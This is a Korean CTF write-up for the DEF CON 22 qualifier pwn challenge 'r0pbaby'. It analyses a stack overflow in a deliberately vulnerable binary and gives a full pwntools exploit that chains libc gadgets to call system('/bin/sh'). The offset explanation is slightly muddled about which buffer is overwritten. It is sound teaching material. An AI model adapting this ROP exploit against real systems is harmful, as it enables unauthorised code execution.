---
title: "DEF CON 22 CTF Qualifier: r0pbaby"
date: 2014-05-16
description: "DEF CON 22 CTF qualifier r0pbaby writeup: 64-bit ROP chain construction via shared library base leak, PLT/GOT traversal, and system() call"
tags: ["DEF CON", "CTF", "ROP", "64-bit", "pwn", "PLT", "GOT", "libc"]
platform: "ctf"
category: "pwn"
difficulty: "medium"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## checksec

```bash
[*] '/mnt/c/Users/user/Desktop/pwnable/pwn/baby/r0pbaby/r0pbaby'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

PIE는 활성화되어 있지만 스택 카나리는 없다. NX가 활성화되어 있으므로 스택에서 셸코드를 직접 실행할 수는 없다 — ROP 체인이 필요하다. 다행히 바이너리는 libc 베이스 주소와 임의의 libc 심볼 주소를 노출하는 메뉴 옵션을 제공한다.

## 프로그램 실행

```bash
➜  r0pbaby ./r0pbaby

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 1
libc.so.6: 0x00007F12580B2500
----------------------------------------
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 2
Enter symbol: system
Symbol system: 0x00007F1257F0F410
----------------------------------------
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 4
Exiting.
```

프로그램은 `dlopen`으로 `libc.so.6`을 열고, 세 가지 프리미티브를 노출한다:

- **옵션 1** — `dlopen`이 반환한 핸들을 출력하는데, 이것이 libc 베이스 주소다.
- **옵션 2** — 사용자가 제공한 심볼 이름으로 `dlsym`을 호출하고 해석된 주소를 출력한다.
- **옵션 3** — 최대 1024바이트를 `nptr`로 읽은 뒤 `memcpy`로 스택에 직접 복사한다.

## 소스 분석

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int num; // eax
  void *v4; // rax
  unsigned __int64 num_2; // r14
  int idx; // er13
  uint64_t length; // r12
  int data; // eax
  void *handle; // [rsp+8h] [rbp-448h]
  char nptr[1088]; // [rsp+10h] [rbp-440h] BYREF
  __int64 savedregs; // [rsp+450h] [rbp+0h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  signal(14, handler);
  alarm(0x3Cu);
  puts("\nWelcome to an easy Return Oriented Programming challenge...");
  puts("Menu:");
  handle = dlopen("libc.so.6", 1);
  while ( 1 )
  {
    ...
    if ( num != 3 )
      break;
    __printf_chk(1LL, "Enter bytes to send (max 1024): ");
    char_copy_B9A(nptr, 1024LL);
    num_2 = (int)strtol(nptr, 0LL, 10);
    if ( num_2 - 1 > 0x3FF )
    {
      puts("Invalid amount.");
    }
    else
    {
      ...
LABEL_22:
      memcpy(&savedregs, nptr, length);  // 여기서 오버플로우 발생
    }
  }
  ...
}
```

핵심 취약점은 옵션 3에 있다. 사용자로부터 바이트 수를 읽은 뒤, 해당 바이트 수만큼 `nptr[1088]`로 읽어들이고 다음을 호출한다:

```c
memcpy(&savedregs, nptr, length);
```

`savedregs`는 `[rbp+0]`에 위치하므로, 스택의 저장된 RBP 바로 위에 있다. `nptr` 버퍼는 `[rbp-0x440]`에서 시작한다(저장된 RBP보다 1088바이트 아래). 따라서 `savedregs` 시작점에서 8바이트 이상을 쓰면 리턴 주소를 덮어쓰게 된다.

바이너리는 스트립되어 있으므로 `nm`이나 디버거 심볼 조회로 정확한 오프셋을 찾을 수 없다:

```bash
➜  r0pbaby nm r0pbaby
nm: r0pbaby: no symbols
```

오프셋은 경험적으로 계산한다: `nptr`은 `[rbp-0x440]`에, `savedregs`는 `[rbp+0]`에 있으므로 `nptr`에서 저장된 리턴 주소까지는 `0x440 + 8 = 0x448`(1096)바이트다.

## 익스플로잇 전략

스택 카나리가 없고 자체 페이로드에 대한 ASLR 보호도 없으므로(정확한 주소를 직접 제공하므로), 계획은 다음과 같다:

1. 옵션 1로 libc 베이스를 누출한다.
2. 옵션 2로 `system` 주소를 누출하고 libc 내의 `pop rdi ; ret` 가젯을 찾는다.
3. 옵션 3으로 ROP 체인을 작성한다: `[패딩] [pop rdi ; ret] ["/bin/sh" 주소] [system 주소]`

### 가젯 찾기

`system`의 첫 번째 인자를 설정하기 위해 `pop rdi ; ret`이 필요하다. PIE가 활성화되어 있고 바이너리는 스트립되어 있으므로 libc를 직접 검색한다:

```python
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop  = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

런타임에 가젯 주소는 `libc_base + pop_rdi_offset`이다.

## 익스플로잇

```python
from pwn import *

p = process('./r0pbaby')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def menu(choice):
    p.recvuntil(': ')
    p.sendline(str(choice))

def get_libc_base():
    menu(1)
    p.recvuntil('libc.so.6: ')
    return int(p.recvline().strip(), 16)

def get_symbol(sym):
    menu(2)
    p.recvuntil('Enter symbol: ')
    p.sendline(sym)
    p.recvuntil('Symbol %s: ' % sym)
    return int(p.recvline().strip(), 16)

def send_rop(payload):
    menu(3)
    p.recvuntil('Enter bytes to send (max 1024): ')
    p.sendline(str(len(payload)))
    p.send(payload)

libc_base  = get_libc_base()
system     = get_symbol('system')
bin_sh     = libc_base + next(libc.search(b'/bin/sh'))

rop_libc   = ROP(libc)
pop_rdi    = libc_base + rop_libc.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = libc_base + rop_libc.find_gadget(['ret'])[0]

# nptr에서 저장된 RIP까지 오프셋: 0x440 (nptr 크기) + 8 (저장된 RBP)
padding = b'A' * (0x440 + 8)

payload  = padding
payload += p64(ret_gadget)   # system()을 위한 스택 정렬
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

send_rop(payload)

p.interactive()
```

### `memcpy` 시점의 스택 레이아웃

```
[rsp]           → nptr[0]          ← 우리가 제어하는 데이터의 시작
...
[rbp-0x440]    → nptr[0]
[rbp+0x00]     → 저장된 RBP       ← 'AAAA....'으로 덮어씀
[rbp+0x08]     → 저장된 RIP       ← ret 가젯으로 덮어씀
[rbp+0x10]     ← pop rdi ; ret
[rbp+0x18]     ← /bin/sh 주소
[rbp+0x20]     ← system()
```

## 요약

r0pbaby는 64비트 ROP의 간단한 입문 문제다. 바이너리가 의도적으로 libc 베이스 누출과 심볼 해석 기능을 제공하므로, 실제 과제는 스택 쓰기 프리미티브와 가젯 체이닝만 남는다. 핵심 포인트:

- `dlopen` 핸들 == 공유 라이브러리 로드 주소로, 베이스로 바로 사용 가능하다.
- `dlsym`은 런타임에 심볼을 해석하여 ASLR 브루트포스 없이 정확한 함수 주소를 제공한다.
- 64비트 호출 규약에서 첫 번째 인자는 `rdi`에 들어간다; `pop rdi ; ret` 가젯이 표준 설정 방법이다.
- `system` 호출 전 16바이트 스택 정렬이 필요하다 — 정렬이 안 되면 glibc의 `movaps` 명령이 크래시를 일으킨다.
